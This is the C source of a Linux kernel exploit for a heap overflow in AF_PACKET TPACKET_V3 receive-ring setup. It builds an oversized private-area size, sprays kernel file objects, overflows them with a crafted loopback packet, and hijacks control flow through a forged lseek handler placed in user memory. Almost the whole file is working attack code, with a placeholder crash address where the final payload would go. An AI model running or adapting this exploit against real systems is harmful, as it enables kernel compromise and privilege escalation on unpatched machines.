#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <keyutils.h>
#include <pthread.h>
#include <linux/kcmp.h>
#include "libexp.h"

#define CRASH_IP 0xffffffffdeadbeef
#define UADDR 0x4000000

// packet_sock->xmit
#define XMIT_OFFSET	1296
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))
#define ETH_HDR_LEN	sizeof(struct ethhdr)

int sock_fd;
unsigned int sizeof_priv;
char payload[0x100];

struct file {
	char hole1[0x28];
	void *f_op;
	char hole2[0x14];
	unsigned int f_mode;
	char hole3[0xb8];
};

struct file_operations {
	char hole1[0x8];
	void* llseek;
	void* read;
	char hole2[0xd8];
};

struct kernel_param {
	char hole1[0x10];
	void *ops;
	char hole2[0x8];
	void *arg;
};

struct kernel_param_ops {
	char hole1[0x10];
	uint64_t rdx; // void* get
	void* free;
};

struct fetch_param {
	void* fn;
	char hole1[0x8];
};

struct deref_fetch_param {
	struct fetch_param orig;
	char hole1[0x18];
};

struct irqaction {
	void* handle;
	void* dev_id;
	char hole[0x70];
};

struct irq_desc {
	char hole1[0x68];
	struct irqaction* action;
	char hole2[0x110];
};

int fd[0x1000];
struct file fake_file;

void init_packet_socket_rx_ring(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	// specify using TPACKET_V3 version cause this vulnerability
	// only impacts this verison
	// setup_packet_socket_buffer(0x1000, 0x200, 2, 0xc0008c56, 100);
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;
	
	// vulnerability happens in this system call
	printf("vulnerability happens in this system call\n");
	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int setup_packet_socket_buffer(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	// setup_packet_socket_buffer(0x1000, 0x200, 2, 0xc0008c56, 100);
	// create a AF_PACKET socket
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	init_packet_socket_rx_ring(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void send_packet(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	printf("send_packet\n");

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

int kmalloc_file(int num) {
	int i = 0;
	char filename[20];
	for (i = 0; i < num; i++) {
		sprintf(filename, "test%d", i);
		printf("kmalloc file: %s\n", filename);
		fd[i] = open(filename, O_WRONLY | O_CREAT);
		if (unlikely(fd[i] < 0)) {
			perror("alloc_file\n");
			return -1;
		}
	}
	return 0;
}

int hijack_lseek(void* kaddr) {
	int i = 0;
	// overflow will occupy some bytes of the file object
	// right before victim file object which makes it 
	// fragile. Therefore, we lseek inversely
	printf("trying to hijack control flow\n");
	for (i = 127; i >= 0; i--) {
		lseek(fd[i], 0, SEEK_SET);
	}
	return 0;
}

int kmalloc_packet_sock(){
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void context_setup(void)
{
	sock_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (sock_fd == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void payload_setup(void) {
	int offset = 0x110;
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	// macoff = 0x52 get added in tpacket_rcv() -> skb_copy_bits()
	unsigned int macoff = netoff - maclen;

	// BLK_HDR_LEN = 48 is the length of tpacket_block_desc
	// which is at the beginning of block
	sizeof_priv = (1u<<31) + (1u<<30) +
		0x1000 - BLK_HDR_LEN - macoff + offset; // 0xc0008c56
	printf("sizeof_priv: 0x%x\n", sizeof_priv);

	void *uaddr = umem_alloc((void *)UADDR, 0x1000);
	((struct file_operations *)uaddr)->llseek = (void *)CRASH_IP;

	memset(payload, 'A', sizeof(payload));
	*(long *)&payload[0x16] = UADDR;
}

int main()
{
	context_setup();
	payload_setup();

	/* 
	 *  drain the page allocator freelists and
	 *  cause some high-order page block to be splited
	 *  create a packet socket and attach a ring buffer with 0x1000
	 *  blocks of size 0x1000 and frame size as 0x200
	 */
	//setup_packet_socket_buffer(0x1000, 0x200, 0x1000, 0, 100);

	/*
	 *  create 512 keys to exhaust kmalloc-256 cache which uses 0x4000 slabs
	 */
	//defragment(0x100, 0x200);

	/* 
	 *  create a packet socket and attach a ring buffer 
	 *  with 2 blocks of size 0x8000 and frame size as 2048
	 *  the second block is used to overflow
	 */

	setup_packet_socket_buffer(0x1000, 0x200, 2, sizeof_priv, 100);
	/*
	 *  open files to allocate file structures and 
	 *  cause allocation of at least one new slab which is right after 
	 *  the second block
	 */
	// nonsense();
	kmalloc_file(1);

	/*
	 * cause overflow 
	 */
	send_packet(sock_fd, payload, 0x20);

	/*
	 * hijack control flow
	 */

	hijack_lseek((void *)UADDR);

	return 0;
}
